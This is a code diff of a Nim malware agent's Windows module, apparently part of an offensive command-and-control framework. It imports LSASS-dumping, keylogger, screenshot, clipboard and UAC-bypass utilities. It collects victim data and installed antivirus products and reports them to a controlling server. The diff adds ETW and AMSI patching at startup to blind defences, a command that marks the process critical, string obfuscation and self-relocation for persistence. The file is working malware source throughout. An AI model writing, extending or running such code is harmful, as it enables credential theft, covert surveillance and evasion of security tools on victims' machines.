@@ -2,7 +2,7 @@
 import ../config
 import ../common
 import utils/incl/[evillsasstwin]
-import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv]
 # External imports
 import std/[tables, nativesockets, json]
 import wAuto/[registry, window]
@@ -13,6 +13,7 @@ import threadpool
 import nimprotect
 import strformat
 import strutils
+import sequtils
 import osproc
 import crc32
 import os
@@ -44,10 +45,10 @@ proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string): bool
 proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
+proc wrap_set_critical(is_critical: bool): bool
 
 # Helpers
 proc get_windows_agent_id*(): string
-proc is_elevated_str(): string
 
 # Globals
 let client = newHttpClient(userAgent=get_windows_agent_id())
@@ -80,7 +81,10 @@ proc collect_data(): bool =
     except:
         process = could_not_retrieve
     try:
-        username = execute_encoded_powershell(protectString("WwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkALgBuAGEAbQBlAAoA"))
+        var username_c: array[256, TCHAR]
+        var username_c_len: DWORD = 256
+        GetUserName(addr username_c[0], addr username_c_len)
+        username = $username_c.mapIt(it.chr).join()
     except:
         username = could_not_retrieve
     try:
@@ -88,7 +92,7 @@ proc collect_data(): bool =
     except:
         is_admin = could_not_retrieve
     try:
-        is_elevated = is_elevated_str()
+        is_elevated = capitalizeAscii($is_elevated())
     except:
         is_elevated = could_not_retrieve
     try: 
@@ -153,7 +157,7 @@ proc checksec(): bool =
     try:
         var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\securitycenter2"))
         for i in wmi.execQuery(protectString("SELECT displayName FROM AntiVirusProduct")):
-            products = products & "\n[+] " & $i.displayName
+            products = products & protectString("\n[+] ") & $i.displayName
         is_success = true
     except:
         is_success = false
@@ -196,7 +200,7 @@ proc enum_visible_windows(): bool =
     try:
         for i in windows():
             if i.isVisible() and i.getTitle().len() > 1:
-                windows.add("[+] [" & i.getTitle() & "]\n")
+                windows.add(protectString("[+] [") & i.getTitle() & "]\n")
         is_success = true
     except:
         is_success = false
@@ -454,12 +458,12 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_patch_func(func_name: string): bool =
     
     var is_success = patch_func(func_name)
-    
     var data = {
+        protectString("patch"): func_name,
         protectString("is_success"): $is_success
     }.toOrderedTable()
     
-    is_success = post_data(client, func_name , $data)
+    is_success = post_data(client, protectString("patch") , $data)
 
     return is_success
 
@@ -573,18 +577,16 @@ proc speak(text: string): bool =
     return is_success
 
 
-proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
-    var is_success: bool
-    call_home_timeframe = timeframe
-    call_home_jitter_percent = jitter_percent
+proc wrap_set_critical(is_critical: bool): bool =
+
+    var is_success = set_critical(is_critical) == 0
     
     var data = {
-        protectString("sleep_timeframe"): $call_home_timeframe,
-        protectString("sleep_jitter_percent"): $call_home_jitter_percent,
+        protectString("is_critical"): $is_critical,
         protectString("is_success"): $is_success
     }.toOrderedTable()
-    
-    is_success = post_data(client, protectString("sleep") , $data)
+
+    is_success = post_data(client, protectString("critical") , $data)
     return is_success
 
 
@@ -610,10 +612,6 @@ proc get_windows_agent_id*(): string =
     return uaid.toLower()
 
 
-proc is_elevated_str(): string =
-    return execute_encoded_powershell(protectString("KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApACkALgBJAHMASQBuAFIAbwBsAGUAKAAiAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACkA"))
-
-
 ##########################
 ##### Core functions #####
 ##########################
@@ -622,19 +620,42 @@ proc is_elevated_str(): string =
 proc windows_start*(): void =
 
     # if elevated - let the unelevated agent know (needed for uac bypass commands)
-    if is_elevated_str().strip() == protectString("True"):
+    if is_elevated():
         discard create_elevated_mutex()
-
+    
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
     if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
+        # copy and execute to the target path
         var agent_execution_dir = splitFile(agent_execution_path_windows)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_windows)
         discard startProcess(agent_execution_path_windows, options={poDaemon})
         quit()
     else:
+        # patch etw & amsi as needed
+        var is_etw_success: string
+        var is_amsi_success: string
+        if patch_etw_on_start:
+            is_etw_success = $patch_func(protectString("etw"))
+        else:
+            is_etw_success = protectString("skipped")
+        if patch_amsi_on_start:
+            is_amsi_success = $patch_func(protectString("amsi"))
+        else:
+            is_amsi_success = protectString("skipped")
+        
+        # collect agent data
         discard collect_data()
+        
+        # report etw & amsi patching status
+        if patch_etw_on_start or patch_amsi_on_start:
+            var data = {
+                protectString("patch_etw"): is_etw_success,
+                protectString("patch_amsi"): is_amsi_success
+            }.toTable 
+            discard post_data(client, protectString("patch") , $data)
+
 
 
 proc windows_parse_command*(command: JsonNode): bool =
@@ -708,12 +729,14 @@ proc windows_parse_command*(command: JsonNode): bool =
             discard post_data(client, protectString("msgbox") , $data)
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
+        of protectString("critical"):
+            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))
         of protectString("sleep"):
             is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
             is_success = collect_data()
-        of protectString("kill"):
-            kill_agent(client)
+        of protectString("die"):
+            die(client)
 
         else:
             is_success = false
